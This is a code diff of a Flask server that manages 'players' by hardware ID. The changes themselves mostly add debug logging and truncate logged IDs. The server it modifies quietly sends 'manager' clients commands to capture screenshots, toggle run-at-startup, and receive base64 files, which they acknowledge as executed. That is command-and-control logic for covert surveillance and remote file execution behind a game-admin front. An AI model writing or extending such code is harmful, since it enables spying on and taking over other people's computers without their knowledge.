@@ -431,7 +431,9 @@ def register():
     data = request.json
     hwid = data.get('hwid')
     username = data.get('username', '')
-    client_type = data.get('type', 'main')  # 'main' or 'manager'
+    client_type = data.get('type', 'main')
+    print(f"[SERVER] Register: HWID={hwid[:8]}..., type={client_type}, username={username}")  # debug
+
     if not hwid:
         return jsonify({'error': 'missing hwid'}), 400
 
@@ -458,25 +460,24 @@ def register():
 
     # Only send commands to 'manager' clients
     if client_type == 'manager':
-        # Screenshot request
         if hwid in screenshot_requests and screenshot_requests[hwid]:
             response['screenshot'] = True
             del screenshot_requests[hwid]
+            print(f"[SERVER] Sent screenshot request to {hwid[:8]}...")
 
-        # Startup toggle
         if hwid in startup_requests:
             response['startup'] = startup_requests[hwid]
             PLAYERS[hwid]['startup'] = startup_requests[hwid]
             del startup_requests[hwid]
+            print(f"[SERVER] Sent startup toggle to {hwid[:8]}...")
 
-        # File delivery
         if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
             response['file_payload'] = {
                 'filename': PENDING_FILES[hwid]['filename'],
                 'content_b64': PENDING_FILES[hwid]['content_b64']
             }
             PENDING_FILES[hwid]['status'] = 'delivered'
-            print(f"[+] Delivered file to {hwid}: {PENDING_FILES[hwid]['filename']}")
+            print(f"[+] Delivered file to {hwid[:8]}...: {PENDING_FILES[hwid]['filename']}")
 
     if status == 'kicked':
         PLAYERS[hwid]['status'] = 'active'
@@ -496,9 +497,9 @@ def ack():
     status = data.get('status', 'executed')
     if hwid in PENDING_FILES and PENDING_FILES[hwid].get('filename') == filename:
         PENDING_FILES[hwid]['status'] = status
-        print(f"[+] Acknowledgment from {hwid}: {filename} - {status}")
+        print(f"[+] Acknowledgment from {hwid[:8]}...: {filename} - {status}")
     else:
-        print(f"[!] Acknowledgment from unknown: {hwid} - {filename}")
+        print(f"[!] Acknowledgment from unknown: {hwid[:8]}... - {filename}")
     return '', 204
 
 # ============================================
@@ -519,7 +520,7 @@ def upload_screenshot():
         with open(filepath, "wb") as f:
             f.write(image_data)
         screenshot_files[hwid] = filename
-        print(f"[+] Screenshot saved for {hwid}: {filename}")
+        print(f"[+] Screenshot saved for {hwid[:8]}...: {filename}")
         return jsonify({'status': 'ok'})
     except Exception as e:
         print(f"[!] Screenshot save error: {e}")
@@ -539,7 +540,7 @@ def request_screenshot():
     if hwid in screenshot_files:
         del screenshot_files[hwid]
     screenshot_requests[hwid] = True
-    print(f"[+] Screenshot requested for {hwid}")
+    print(f"[+] Screenshot requested for {hwid[:8]}...")
     return jsonify({'status': 'ok'})
 
 # ============================================
@@ -555,7 +556,7 @@ def toggle_startup():
     if hwid not in PLAYERS:
         return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
     startup_requests[hwid] = enabled
-    print(f"[+] Startup toggle for {hwid}: {enabled}")
+    print(f"[+] Startup toggle for {hwid[:8]}...: {enabled}")
     return jsonify({'status': 'ok'})
 
 # ============================================
@@ -574,7 +575,7 @@ def ban_player():
     if hwid in PLAYERS:
         PLAYERS[hwid]['status'] = 'banned'
         save_data(PLAYERS)
-        print(f"[+] Banned {hwid}")
+        print(f"[+] Banned {hwid[:8]}...")
     return '', 204
 
 @app.route('/admin/unban', methods=['POST'])
@@ -583,7 +584,7 @@ def unban_player():
     if hwid in PLAYERS:
         PLAYERS[hwid]['status'] = 'active'
         save_data(PLAYERS)
-        print(f"[+] Unbanned {hwid}")
+        print(f"[+] Unbanned {hwid[:8]}...")
     return '', 204
 
 @app.route('/admin/kick', methods=['POST'])
@@ -592,7 +593,7 @@ def kick_player():
     if hwid in PLAYERS:
         PLAYERS[hwid]['status'] = 'kicked'
         save_data(PLAYERS)
-        print(f"[+] Kicked {hwid}")
+        print(f"[+] Kicked {hwid[:8]}...")
     return '', 204
 
 @app.route('/admin/settings', methods=['POST'])
@@ -609,7 +610,7 @@ def set_settings():
             value = int(value)
         PLAYERS[hwid]['settings_override'] = {'setting': setting, 'value': value}
         save_data(PLAYERS)
-        print(f"[+] Settings for {hwid}: {setting}={value}")
+        print(f"[+] Settings for {hwid[:8]}...: {setting}={value}")
     return '', 204
 
 @app.route('/admin/upload_file', methods=['POST'])
@@ -627,7 +628,7 @@ def upload_file():
         'content_b64': content_b64,
         'status': 'queued'
     }
-    print(f"[+] File queued for {hwid}: {filename} ({len(content_b64)} chars)")
+    print(f"[+] File queued for {hwid[:8]}...: {filename} ({len(content_b64)} chars)")
     return jsonify({'status': 'ok'}), 200
 
 if __name__ == '__main__':
